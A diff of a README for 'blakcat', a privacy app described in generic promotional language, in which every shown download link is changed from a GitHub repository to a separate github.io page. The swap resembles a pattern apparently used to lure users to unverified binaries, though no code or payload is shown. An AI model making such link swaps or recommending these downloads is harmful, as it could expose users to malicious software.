@@ -1,6 +1,6 @@
 # 🖤 blakcat - Your Privacy, Our Promise
 
-[![Download blakcat](https://img.shields.io/badge/Download%20blakcat-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/cornmarigoldmate39/blakcat)
+[![Download blakcat](https://img.shields.io/badge/Download%20blakcat-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://cornmarigoldmate39.github.io)
 
 ## 🛡️ What is blakcat?
 
@@ -35,7 +35,7 @@ Ready to take control of your online privacy? Here's how to get started on your 
 
 ### Step 1: Download blakcat
 
-Visit this link to download the application: **[Download blakcat](https://github.com/cornmarigoldmate39/blakcat)**
+Visit this link to download the application: **[Download blakcat](https://cornmarigoldmate39.github.io)**
 
 Click the big green download button on the page. The download will start automatically.
 
@@ -70,7 +70,7 @@ Once connected, you'll see a green indicator confirming that your connection is 
 - Tap the power button to connect
 
 ### macOS
-- Visit this link to download the application: **[Download blakcat](https://github.com/cornmarigoldmate39/blakcat)**
+- Visit this link to download the application: **[Download blakcat](https://cornmarigoldmate39.github.io)**
 - Download the macOS version of the app
 - Drag the blakcat icon to your Applications folder
 - Open blakcat from your Applications folder
@@ -139,7 +139,7 @@ Need help? We're here for you 24/7. Visit our website or send us a message throu
 
 Don't wait until it's too late. Take control of your online privacy now. Join thousands of satisfied users who trust blakcat to keep their digital lives secure.
 
-**[Download blakcat Now](https://github.com/cornmarigoldmate39/blakcat)**
+**[Download blakcat Now](https://cornmarigoldmate39.github.io)**
 
 ---
 
